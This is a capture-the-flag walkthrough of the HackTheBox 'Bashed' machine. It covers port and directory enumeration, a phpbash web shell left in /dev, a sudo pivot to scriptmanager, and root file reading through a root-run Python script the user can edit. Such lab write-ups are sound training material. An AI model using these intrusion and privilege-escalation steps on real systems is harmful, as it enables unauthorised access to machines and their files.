# Hackthebox Bashed

Reset the machine just in case.

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ sudo nmap -A -T4 -p- 10.10.10.68
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-19 11:01 EST
Nmap scan report for 10.10.10.68
Host is up (0.035s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=12/19%OT=80%CT=1%CU=37392%PV=Y%DS=2%DC=T%G=Y%TM=61BF57
OS:63%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)SE
OS:Q(SP=107%GCD=1%ISR=10B%TI=Z%CI=I%TS=8)OPS(O1=M54DST11NW7%O2=M54DST11NW7%
OS:O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2
OS:=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   34.89 ms 10.10.14.1
2   34.95 ms 10.10.10.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.25 seconds

```

Gobuster for the directories

```
$ gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.68
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/19 11:01:35 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]    
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]    
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]    
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]     
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]  
/server-status        (Status: 403) [Size: 299]                                  
                                                                                 
===============================================================
2021/12/19 11:14:33 Finished
===============================================================
```

And Nikto to check some vulnerabilities

```
─(kali㉿kali)-[~/Documents/CTF/hackthebox/Bashed]
└─$ nikto -h 10.10.10.68
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.68
+ Target Hostname:    10.10.10.68
+ Target Port:        80
+ Start Time:         2021-12-19 11:01:22 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 1e3f, size: 55f8bbac32f80, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /dev/: Directory indexing found.
+ OSVDB-3092: /dev/: This might be interesting...
+ OSVDB-3268: /php/: Directory indexing found.
+ OSVDB-3092: /php/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7864 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2021-12-19 11:06:57 (GMT-5) (335 seconds)
---------------------------------------------------------------------------
```

In the dev-directory there is a readinly installed phpbash ready to be used.

## System Hacking

The user flag does not require any actions, it is up for grabs in

```
www-data@bashed
:/home/arrexel# pwd

/home/arrexel
www-data@bashed
:/home/arrexel# ls -al user.txt

-r--r--r-- 1 arrexel arrexel 33 Dec 4 2017 user.txt
```

For privilege escalation first we find we can execute any commands as scriptmanager, and start by kicking up a shell

```
www-data@bashed:/tmp$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/tmp$ sudo -u scriptmanager /bin/bash
sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/tmp$ whoami
whoami
scriptmanager
scriptmanager@bashed:/tmp$
```

After a little search we find a directory /scripts, that contains interesting files. It seems the python script test.py gets executed once a minute as a root. By modifying the script (on the attacker machine as vi behaves badly) we can get the directory listing and the flag.

```
criptmanager@bashed:/scripts$ cat test.py
cat test.py
import os

f = open("rootdirlist.txt", "w")
f.write(os.popen("ls -l /root").read())
f.close

f = open("rootflag.txt", "w")
f.write(os.popen("cat /root/root.txt").read())
f.close
```

Reading the written files
```
scriptmanager@bashed:/scripts$ cat rootdirlist.txt rootflag.txt
cat rootdirlist.txt rootflag.txt
total 4
-r-------- 1 root root 33 Dec  4  2017 root.txt
cc4f0...
scriptmanager@bashed:/scripts$
```
